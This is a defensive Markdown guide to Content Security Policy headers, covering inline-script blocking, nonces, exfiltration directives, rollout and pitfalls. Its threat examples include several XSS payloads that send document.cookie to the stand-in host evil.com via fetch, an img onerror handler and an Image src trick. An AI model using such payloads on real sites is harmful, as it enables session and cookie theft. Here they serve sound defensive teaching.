# Content Security Policy (CSP)

A response header that tells the browser **which places it may load and run
scripts from**. Anything not on the list is refused, even if the tag is
sitting right there in your HTML.

```
Content-Security-Policy: script-src 'self' https://cdn.example.com; object-src 'none'
```

## What "source" means here

Not "another website running code on your page" — that can't happen anyway,
the browser already keeps origins apart. A source is just **where the script
file came from**: a URL, or "no URL at all, it was written inline in the
page."

## The problem it solves

The browser runs any `<script>` it finds in your HTML. It has no way to tell
yours apart from one an attacker injected — both arrived in the same
response, over the same connection.

```html
<script src="https://cdn.example.com/analytics.js"></script>  <!-- yours -->
<script src="https://evil.com/steal.js"></script>              <!-- injected -->
```

Both run, and both get your DOM, your cookies, your logged-in session. See
[xss.md](xss.md) for how the injection gets there in the first place.

CSP gives the browser a second opinion that the attacker can't touch. The
header comes from your server; injected HTML can't add to it or change it.

```
Content-Security-Policy: script-src 'self' https://cdn.example.com
```

"Only run scripts from my own site, or that CDN." Now `evil.com` is refused
— the tag stays in the DOM, but the code never runs, and the browser logs a
violation.

**CSP is a safety net, not a fix.** The real fix is escaping output properly.
CSP is what limits the damage when you get that wrong somewhere.

## Inline script is the important part

Most XSS payloads have no URL at all:

```html
<script>fetch('https://evil.com?c=' + document.cookie)</script>
<img src=x onerror="fetch('https://evil.com?c=' + document.cookie)">
<a href="javascript:steal()">click</a>
```

A list of allowed URLs is no help against code that has no URL. So CSP does
this: **the moment you set `script-src` at all, inline script is blocked by
default** — inline `<script>` blocks, `onclick=`-style handlers,
`javascript:` links, and `eval` / `new Function`.

That default block is where most of the protection actually comes from.
`'unsafe-inline'` switches it back on, which is why it defeats the whole
point of setting the header.

## Nonces — keeping your own inline scripts

If you genuinely need an inline script, give it a random token that changes
on every page load:

```
Content-Security-Policy: script-src 'nonce-abc123xyz'
```

```html
<script nonce="abc123xyz">initApp()</script>   <!-- runs -->
<script>stealCookies()</script>                <!-- blocked, no nonce -->
```

The attacker can inject a tag but can't guess the token, so their script
can't carry a valid one.

Two rules, or it's worthless:

- **random** — generate it with `crypto.randomBytes(16).toString("base64")`,
  see [crypto-random-ids.md](crypto-random-ids.md)
- **new on every response** — a hardcoded or per-session nonce is just
  `'unsafe-inline'` in disguise

```js
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString("base64");
  res.setHeader(
    "Content-Security-Policy",
    `script-src 'self' 'nonce-${res.locals.nonce}'; object-src 'none'; base-uri 'self'`
  );
  next();
});
```

For a static inline script that never changes, a hash works too —
`'sha256-<base64 hash of the exact script text>'` — no per-request work
needed, but it breaks the moment you edit a character.

## Stopping the data from leaving

Think of it as two locks on the same door.

**Lock 1 — `script-src`: stop bad code from running.** This is the main lock.
If it holds, the attacker's script never executes and you're done.

**Lock 2 — the other directives: stop the code sending anything anywhere.**
Locks fail sometimes. A CDN you trusted gets hacked, a nonce leaks into a
cached page. So you also assume the worst and ask: okay, the script is
running — now what can it actually do?

Here's the thing: stolen data is worthless sitting in the browser. The
attacker has to get it out to their own server. Every row below blocks one
way out:

| Directive | Stops |
| --- | --- |
| `connect-src` | `fetch` / XHR / WebSocket to `evil.com` |
| `img-src` | the `new Image().src = 'https://evil.com?c=' + cookie` trick |
| `form-action` | a form rewritten to POST your credentials elsewhere |
| `base-uri 'self'` | an injected `<base>` tag hijacking every relative script URL |
| `frame-ancestors 'none'` | your page being framed — clickjacking, see [clickjacking.md](clickjacking.md) |
| `object-src 'none'` | Flash/plugin content, a legacy script-execution route |
| `default-src` | fallback for any resource type you didn't name |

`img-src` is the one people forget. Loading an "image" from `evil.com` sends
the cookie in the URL — no response needed, no CORS check. Block `fetch` but
leave images open and you've locked the door and left the window wide open.

Two of those rows are really extra lock 1, not lock 2: `base-uri` and
`object-src` cover sneaky ways to *run* code that slip past `script-src`
entirely, rather than ways to get data out.

So: lock 1 tries to prevent the break-in, lock 2 makes sure a burglar who
gets in can't carry anything out. Setting only `script-src` is one lock and
no backup.

## Common source values

| Value | Means |
| --- | --- |
| `'self'` | the page's own origin — exact scheme + host + port. Does **not** include inline. |
| `'none'` | nothing at all |
| `https://cdn.example.com` | that specific host |
| `'nonce-…'` | inline scripts carrying this token |
| `'sha256-…'` | inline scripts whose text matches this hash |
| `'unsafe-inline'` | all inline script — avoid |
| `'unsafe-eval'` | `eval`, `new Function`, `setTimeout("string")` — avoid |
| `'strict-dynamic'` | a script you already trusted may load more scripts, and the URL allowlist is ignored. Useful when a trusted bundle injects tags at runtime. |

## Which responses get the header

**Every HTML response. Not API responses.**

CSP is enforced **per document** — the browser applies it to the page it's
rendering. A JSON response your frontend gets via `fetch` never becomes a
document, so a CSP header on it is simply ignored. What governs that `fetch`
is the *calling page's* `connect-src`, set on the HTML.

```
GET /dashboard   → text/html          → CSP applies
GET /api/orders  → JSON via fetch     → CSP ignored; the page's connect-src decides
```

| Response | Header |
| --- | --- |
| any HTML page | the full policy — this is the one that matters |
| HTML error pages (404, 500) | same policy — easy to forget, and they often echo user input |
| login / OAuth / embedded pages | same policy, sometimes stricter |
| JSON, images, downloads | hardened stub (below), optional |

**Don't set it route by route.** Apply it as global middleware — forgetting
one route is exactly where the XSS lands, and a nonce policy needs a fresh
header per response anyway.

```js
app.use((req, res, next) => {
  res.locals.nonce = crypto.randomBytes(16).toString("base64");
  res.setHeader(
    "Content-Security-Policy",
    `default-src 'self'; script-src 'self' 'nonce-${res.locals.nonce}'; ` +
    `object-src 'none'; base-uri 'self'; frame-ancestors 'none'`
  );
  next();
});
```

Then loosen it for the few routes that genuinely need more — a page
embedding a third-party widget — rather than tightening route by route.

### The optional stub for non-HTML

Does nothing normally, but it's cheap insurance for the case where a browser
is tricked into *rendering* your JSON as HTML — MIME sniffing, or an
endpoint that reflects input and can be nudged into a `text/html` content
type:

```
Content-Security-Policy: default-src 'none'; frame-ancestors 'none'; sandbox
X-Content-Type-Options: nosniff
```

Sending a correct `Content-Type` is the actual fix; this is the backstop.

## Rolling it out

Turning CSP on cold will break a working app — there's almost always an
inline handler or a forgotten CDN somewhere. Start in report-only mode:

```
Content-Security-Policy-Report-Only: script-src 'self'; report-to csp-endpoint
```

It blocks nothing. It just reports what *would* have been blocked, so you
can clean those up first, then swap the header name to enforce.

In Express, [`helmet`](https://www.npmjs.com/package/helmet) sets a
reasonable default policy as part of its header bundle.

## Gotchas

- **`<meta>` delivery is weaker than the header.** Some directives
  (`frame-ancestors`, `report-uri`) are ignored entirely in a `<meta>` tag.
  Use the response header when you can.
- **Nonces and caching don't mix.** If a CDN caches your HTML, every visitor
  gets the same nonce — and a reused nonce is guessable, which puts you back
  to `'unsafe-inline'`. Send `Cache-Control: no-store` on nonce'd HTML, or
  use hashes on pages you want cached.
- **An allowlisted CDN is a trusted third party.** Anything you allow runs
  with your page's full privileges, so a compromised CDN is a compromised
  site. Pin the file contents with Subresource Integrity:

  ```html
  <script src="https://cdn.example.com/lib.js"
          integrity="sha384-…" crossorigin="anonymous"></script>
  ```
- **Allowlisting a big host can defeat the policy.** Some CDNs host
  user-uploaded or arbitrary JS on the same origin, so allowing the host
  effectively allows anyone. `'strict-dynamic'` with nonces avoids relying
  on host allowlists at all.
- **CSP doesn't stop CSRF.** Different problem — the request there is
  genuine, no script is injected. See [csrf.md](csrf.md).
- **CSP doesn't replace `HttpOnly`.** Keep both; they fail in different
  places.

---